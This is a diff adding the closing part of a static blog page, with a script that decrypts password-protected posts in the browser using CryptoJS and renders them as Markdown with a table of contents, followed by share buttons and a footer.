+<script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    function showDecryptionUI(block) {
+      block.innerHTML = `<div style="padding: 1rem; border: 1px solid #444; border-radius: 8px; background: #1e1e1e;">
+  <label style="display:block; margin-bottom:0.8rem; font-weight:600; font-size:1.1rem; color:#f5f5f5;">
+    🔒 This content is password-protected:
+  </label>
+  <div style="display: flex; align-items: center; gap: 0.75rem;">
+    <input type="password" id="decrypt-password" placeholder="Enter password"
+           style="flex: 1; padding: 0.6rem 0.8rem; font-size: 1rem; background: #2a2a2a; color: #eee; border: 1px solid #555; border-radius: 4px;">
+    <button id="decrypt-button"
+            style="padding: 0.6rem 1rem; background: #2d2d2d; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">
+      Decrypt
+    </button>
+    <div style="display: flex; align-items: center;">
+      <input type="checkbox" id="show-pw" style="margin-left: 0.4rem; cursor: pointer;">
+      <label for="show-pw" title="Show password" style="margin-left: 0.4rem; font-size: 1.2rem; cursor: pointer;">👁️</label>
+    </div>
+  </div>
+  <div id="decrypt-error" style="color: #ff6b6b; margin-top: 0.75rem;"></div>
+</div>
+`;
+      var input = block.querySelector('input[type="password"]');
+      var button = block.querySelector('button');
+      var error = block.querySelector('#decrypt-error');
+      var showPw = block.querySelector('#show-pw');
+      showPw.onchange = function () {
+        input.type = this.checked ? 'text' : 'password';
+      };
+      button.onclick = function () {
+        var password = input.value;
+        var ciphertext_b64 = block.getAttribute('data-encrypted');
+        try {
+          var ciphertext = CryptoJS.enc.Base64.parse(ciphertext_b64);
+          var iv = CryptoJS.lib.WordArray.create(ciphertext.words.slice(0, 4), 16);
+          var actualCiphertext = CryptoJS.lib.WordArray.create(ciphertext.words.slice(4), ciphertext.sigBytes - 16);
+          var key = CryptoJS.SHA256(password);
+          var bytes = CryptoJS.AES.decrypt({ ciphertext: actualCiphertext }, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 });
+          var plaintext = bytes.toString(CryptoJS.enc.Utf8);
+          if (!plaintext) throw new Error('Incorrect password or corrupt data');
+
+          plaintext = plaintext.replace(/!\[\[(.*?)\]\]/g, (match, p1) => {
+            const src = p1.match(/^\//) ? p1 : '/assets/images/' + p1;
+            return `![](${src})`;
+          });
+          plaintext = plaintext.replace(/\[\[(.*?)\]\]/g, (match, p1) => {
+            const href = '/' + p1.trim().replace(/\s+/g, '-').toLowerCase();
+            return `[${p1}](${href})`;
+          });
+          plaintext = plaintext.replace(/!\[\]\((data:image\/[^)]+)\)/g, (match, dataUri) => {
+            return `<img src="${dataUri}" style="max-width:100%; border-radius:8px; margin:1rem 0;">`;
+          });
+
+          if (window.marked) {
+            block.innerHTML = '<div class="post-content">' + marked.parse(plaintext) + '</div>';
+          } else {
+            block.innerHTML = '<pre>' + plaintext + '</pre>';
+            return;
+          }
+          
+          mediumZoom('img:not(.no-zoom)', {
+          margin: 24,
+          background: 'rgba(0, 0, 0, 0.9)',
+          scrollOffset: 40,
+          });
+
+          // ▼▼▼ Inject TOC based on headings ▼▼▼
+          const tocContainer = document.createElement('nav');
+          tocContainer.className = 'toc';
+          const headers = block.querySelectorAll('.post-content h1, .post-content h2, .post-content h3');
+          if (headers.length > 0) {
+            const tocList = document.createElement('ul');
+            headers.forEach(h => {
+              if (!h.id) {
+                h.id = h.textContent.trim().toLowerCase().replace(/\s+/g, '-');
+              }
+              const li = document.createElement('li');
+              li.style.marginLeft = h.tagName === 'H3' ? '1.2em' : h.tagName === 'H2' ? '0.6em' : '0';
+              const a = document.createElement('a');
+              a.href = '#' + h.id;
+              a.textContent = h.textContent;
+              li.appendChild(a);
+              tocList.appendChild(li);
+            });
+            tocContainer.innerHTML = `<strong style="display:block;margin-bottom:0.5em;">▼ Table of Contents</strong>`;
+            tocContainer.appendChild(tocList);
+            block.prepend(tocContainer);
+          }
+          // ▲▲▲ TOC Injection End ▲▲▲
+
+        } catch (e) {
+          let msg = e.message?.match(/utf-?8/i) ? 'Decryption failed' : '❌ ' + (e.message || 'Incorrect password or corrupt data');
+          error.textContent = msg;
+          error.style.display = 'block';
+        }
+      };
+    }
+
+    document.querySelectorAll('.encrypted-content').forEach(showDecryptionUI);
+  });
+</script>
+
+<!-- Share page -->
+<br>
+<div class="robots-nocontent social-share-buttons">
+  <b>Share this content</b>
+  <br>
+  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+    <a class="a2a_button_x"></a>
+    <a class="a2a_button_linkedin"></a>
+    <a class="a2a_button_telegram"></a>
+    <a class="a2a_button_mastodon"></a>
+    <a class="a2a_button_email"></a>
+    <a class="a2a_button_microsoft_teams"></a>
+    <a class="a2a_button_threads"></a>
+    <a class="a2a_button_bluesky"></a>
+    <a class="a2a_button_whatsapp"></a>
+  </div>
+  <br>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+</div>
+
+
+  <!-- End Page End inject -->
+</article>
+
+  </main>
+  <!-- Footer -->
+<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+  <a href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2025">2025</time></a>
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <span class="mr-6 lg:ml-6">
+      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
+    </span>
+    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
+  </div>
+  <!-- Begin Footer inject -->
+  
+  <!-- End Footer inject -->
+</footer>
+
+  
+
+  <!-- Begin Body End inject -->
+  
+  <!-- End Body End inject -->
+</body>
+
+</html>
